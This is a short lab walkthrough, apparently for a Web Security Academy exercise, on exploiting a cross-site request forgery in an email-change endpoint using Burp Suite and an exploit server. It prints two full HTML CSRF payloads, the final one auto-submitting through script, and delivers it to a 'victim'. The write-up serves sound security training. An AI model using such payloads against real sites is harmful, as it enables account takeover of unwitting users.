## Solution steps

- Login with the provided credentials.
- Open Burp suite and set-up proxy.
- Update the email from the website.
- Navigate to HTTP histroy in Burp and find the `POST` request `/my-account/change-email`.
- Copy the contents of the request and paste it in an online CSRF PoC Generator. I used: https://hacktify.in/csrf/
- Copy the CSRF PoC FORM's contents and open the exploit server.
- Paste it in the `Body`.
  ```
  <html>
	<body>
		<form method="POST" action="https://xxxxx.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="tester@normal-user.net"/>
			<input type="submit" value="Submit">
		</form>
	</body>
  <html>
  ```
- Click `Store` and then click the `View exploit` button.
- Click `submit` and notice your email id has changed to `tester@normal-user.net`.
- Add `<script>document.forms[0].submit();</script>` to the payload so you don't have to click the `submit` button.
- Your final payload should look like this:
  ```
  <html>
	<body>
		<form method="POST" action="https://xxxxx.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="Pentester@normal-user.net"/>
			<input type="submit" value="Submit">
		</form>
    <script>document.forms[0].submit();</script>
	</body>
  <html>
  ```
- Click `Store` then `Deliver exploit to victim`.
